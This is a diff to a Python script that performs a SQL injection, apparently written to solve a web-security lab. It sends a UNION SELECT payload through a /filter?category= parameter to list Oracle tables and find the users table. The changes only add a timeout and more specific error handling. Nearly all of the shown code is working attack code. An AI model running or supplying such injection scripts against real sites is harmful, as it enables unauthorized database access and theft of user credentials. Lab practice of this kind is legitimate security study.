@@ -8,18 +8,26 @@ from requests.adapters import HTTPAdapter, Retry
 
 def find_users_table(url, session):
     try:
-        response = session.get(f"{url}/filter?category=' UNION SELECT table_name, NULL FROM all_tables--")
+        response = session.get(f"{url}/filter?category=' UNION SELECT table_name, NULL FROM all_tables--", timeout=10)
         soup = BeautifulSoup(response.text, "html.parser")
         users_table = soup.find(string=re.compile('^USERS_.*'))
 
         if users_table:
             return users_table
         else:
-            print("(-) Something went wrong. Please check your url and try again")
+            print("(-) Something went wrong. Please check your URL and try again")
             sys.exit(1)
 
-    except requests.exceptions.RequestException as e:
-        print(f"(-) An error has occurred: {e}")
+    except requests.exceptions.Timeout:
+        print("(-) Request timed out.")
+        sys.exit(1)
+
+    except requests.exceptions.MissingSchema:
+        print("(-) Please enter a valid URL.")
+        sys.exit(1)
+
+    except requests.exceptions.ConnectionError:
+        print("(-) Unable to connect to host. Please check your URL and try again.")
         sys.exit(1)
 
 
